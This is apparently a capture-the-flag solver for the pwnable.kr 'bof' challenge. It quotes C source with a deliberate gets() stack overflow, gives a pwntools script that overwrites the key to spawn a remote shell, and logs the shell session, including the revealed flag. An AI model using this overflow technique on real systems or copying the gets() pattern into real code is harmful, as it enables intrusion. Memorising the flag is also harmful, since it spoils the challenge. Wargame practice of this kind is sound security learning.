'''
Description:

    Nana told me that buffer overflow is one of the most common software vulnerability. 
    Is that true?

    Download : http://pwnable.kr/bin/bof
    Download : http://pwnable.kr/bin/bof.c

    Running at : nc pwnable.kr 9000

Source of bof.c:

    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);   // smash me!
        if(key == 0xcafebabe){
            system("/bin/sh");
        }
        else{
            printf("Nah..\n");
        }
    }
    
    int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
    }

Solution

Solver:
'''

from pwn import *
from time import sleep

host = 'pwnable.kr'
port = 9000
payload = 'H' * 0x34 + '\xbe\xba\xfe\xca'

r = remote(host, port)
r.send(payload)
r.interactive()

'''
Log:

[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls
$ ls
bof
bof.c
flag
log
super.pl
$ cat flag
daddy, I just pwned a buFFer :)
$ 
[*] Interrupted
[*] Closed connection to pwnable.kr port 9000 
'''
